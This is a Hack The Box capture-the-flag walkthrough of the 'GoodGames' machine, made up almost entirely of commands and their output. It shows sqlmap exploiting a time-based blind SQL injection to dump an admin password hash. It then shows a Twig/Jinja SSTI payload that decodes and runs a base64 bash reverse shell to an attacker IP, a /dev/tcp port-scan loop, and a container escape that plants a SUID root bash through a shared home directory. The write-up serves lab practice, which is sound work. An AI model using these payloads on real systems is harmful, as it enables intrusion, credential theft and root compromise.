1.The webpage login is vulnerable to sqli, It can be exploit with the Sqlmap
```bash
┌──(sabeshan㉿kali)-[~/HTB/OSCP/linux/GooDGames]
└─$ sqlmap -r sql.req --batch -D main -T user --dump 
        ___
       __H__                                                                                                                                                 
 ___ ___[(]_____ ___ ___  {1.9.6#stable}                                                                                                                     
|_ -| . [.]     | .'| . |                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:32:27 /2025-08-29/

[08:32:27] [INFO] parsing HTTP request from 'sql.req'
[08:32:27] [INFO] resuming back-end DBMS 'mysql' 
[08:32:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@gmail.com' AND (SELECT 9507 FROM (SELECT(SLEEP(5)))GDgi) AND 'ipAk'='ipAk&password=pass
---
[08:32:27] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[08:32:27] [INFO] fetching columns for table 'user' in database 'main'
[08:32:27] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                              
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[08:32:40] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
4
[08:32:42] [INFO] retrieved: 
[08:32:52] [INFO] adjusting time delay to 2 seconds due to good response times
id
[08:33:22] [INFO] retrieved: email
[08:34:11] [INFO] retrieved: password
[08:35:40] [INFO] retrieved: name
[08:36:15] [INFO] fetching entries for table 'user' in database 'main'
[08:36:15] [INFO] fetching number of entries for table 'user' in database 'main'
[08:36:15] [INFO] retrieved: 1
[08:36:18] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                     
a
[08:36:44] [INFO] adjusting time delay to 1 second due to good response times
dmin
[08:37:03] [INFO] retrieved: 
[08:37:08] [ERROR] invalid character detected. retrying..
[08:37:08] [WARNING] increasing time delay to 2 seconds
admin@goodgames.htb
[08:40:31] [INFO] retrieved: 1
[08:40:38] [INFO] retrieved: 2b22337f218b2d82dfc3
[08:44:28] [ERROR] invalid character detected. retrying..
[08:44:28] [WARNING] increasing time delay to 3 seconds
b6f77e7cb8ec
[08:47:36] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[08:47:36] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[08:47:36] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[08:47:36] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[08:47:36] [INFO] starting 2 processes 
[08:47:48] [WARNING] no clear password(s) found                                                                                                             
Database: main
Table: user
[1 entry]
+----+---------------------+--------+----------------------------------+
| id | email               | name   | password                         |
+----+---------------------+--------+----------------------------------+
| 1  | admin@goodgames.htb | admin  | 2b22337f218b2d82dfc3b6f77e7cb8ec | --> superadministrator
+----+---------------------+--------+----------------------------------+

[08:47:48] [INFO] table 'main.`user`' dumped to CSV file '/home/sabeshan/.local/share/sqlmap/output/10.10.11.130/dump/main/user.csv'
[08:47:48] [INFO] fetched data logged to text files under '/home/sabeshan/.local/share/sqlmap/output/10.10.11.130'

[*] ending @ 08:47:48 /2025-08-29/
```
After the sqlmap , there is admin credentials was here.
-------------------------------------------------------------------------------------------------
2. There is another login dashboard available on that , on that place use the above creds and get the admin access.
in admin profile there is SSTI vulnerabilities exists. 
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzEzMzcgMD4mMQ==${IFS}|base64${IFS}-d|bash').read()}}
The site vulnerable to twig. Using the above payload it can be get the remote shell.
```bash
──(sabeshan㉿kali)-[~/HTB/OSCP/linux/GooDGames]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.130] 47300
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# 
And shell was gotten
root@3a453ab39d3d:/backend# cd /
root@3a453ab39d3d:/# cd root
root@3a453ab39d3d:~# ls -la
total 20
drwx------ 1 root root 4096 Nov  5  2021 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root    9 Nov  5  2021 .bash_history -> /dev/null
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwx------ 3 root root 4096 Nov  5  2021 .cache
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
This one is root but not actual root
```
------------------------------------------------------------------------------
3.
```bash
for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.2/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
root@3a453ab39d3d:/home/augustus# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/BMOEKLXDA4EFIXZ4O4AP7LYEVQ:/var/lib/docker/overlay2/l/E365MWZN2IXKTIAKIBBWWUOADT:/var/lib/docker/overlay2/l/ZN44ERHF3TPZW7GPHTZDOBQAD5:/var/lib/docker/overlay2/l/BMI22QFRJIUAWSWNAECLQ35DQS:/var/lib/docker/overlay2/l/6KXJS2GP5OWZY2WMA64DMEN37D:/var/lib/docker/overlay2/l/FE6JM56VMBUSHKLHKZN4M7BBF7:/var/lib/docker/overlay2/l/MSWSF5XCNMHEUPP5YFFRZSUOOO:/var/lib/docker/overlay2/l/3VLCE4GRHDQSBFCRABM7ZL2II6:/var/lib/docker/overlay2/l/G4RUINBGG77H7HZT5VA3U3QNM3:/var/lib/docker/overlay2/l/3UIIMRKYCPEGS4LCPXEJLYRETY:/var/lib/docker/overlay2/l/U54SKFNVA3CXQLYRADDSJ7NRPN:/var/lib/docker/overlay2/l/UIMFGMQODUTR2562B2YJIOUNHL:/var/lib/docker/overlay2/l/HEPVGMWCYIV7JX7KCI6WZ4QYV5,upperdir=/var/lib/docker/overlay2/4bc2f5ca1b7adeaec264b5690fbc99dfe8c555f7bc8c9ac661cef6a99e859623/diff,workdir=/var/lib/docker/overlay2/4bc2f5ca1b7adeaec264b5690fbc99dfe8c555f7bc8c9ac661cef6a99e859623/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/sched_debug type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /sys/firmware type tmpfs (ro,relatime)
root@3a453ab39d3d:/home/augustus# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 2314  bytes 398570 (389.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1915  bytes 1770381 (1.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

<}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT
> &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
port 22 is open
port 80 is open

```
Then started trying the open port discovery
```bash
root@3a453ab39d3d:/home/augustus# script /dev/null bash
Script started, file is /dev/null
# ssh augustus@12^H^H
^C
# ssh agus
c^C
# ssh augustus@172.19.0.2
ssh: connect to host 172.19.0.2 port 22: Connection refused
# ssh augustus@172.19.02^H^C
# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
# chown root:root bash
# chmod 4755 bash
# ls -la bash
-rwsr-xr-x 1 root root 1234376 Aug 29 04:42 bash
# 
# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Aug 29 05:39:41 2025 from 172.19.0.2
augustus@GoodGames:~$ ./bash -p
bash-5.1# cat /root/root.txt
f2bf4ca1c35489921620b9fb50033077
bash-5.1#
```
